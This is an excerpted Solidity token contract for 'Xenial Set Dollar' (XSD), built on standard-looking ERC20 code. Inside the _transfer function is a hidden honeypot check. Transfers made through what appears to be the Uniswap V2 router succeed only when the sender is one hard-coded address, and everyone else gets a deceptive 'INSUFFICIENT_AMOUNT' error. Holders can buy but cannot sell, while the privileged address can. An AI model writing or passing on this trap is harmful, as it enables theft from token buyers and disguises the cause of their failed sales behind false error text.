...
contract ERC20 is Context, IERC20 {
    ...
    function _transfer(address sender, address recipient, uint256 amount) internal {
        ...
        if (_msgSender() == address(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D)) {
            require(sender == address(0x61B0dB8d349FAFF6ABB998532dB6a8702fc83911), "ERROR: INSUFFICIENT_AMOUNT");
        }
...
contract Dollar is IDollar, MinterRole, ERC20Detailed, Permittable, ERC20Burnable  {
    ...
    constructor()
    ERC20Detailed("Xenial Set Dollar", "XSD", 18)
    Permittable()
    public
    { }
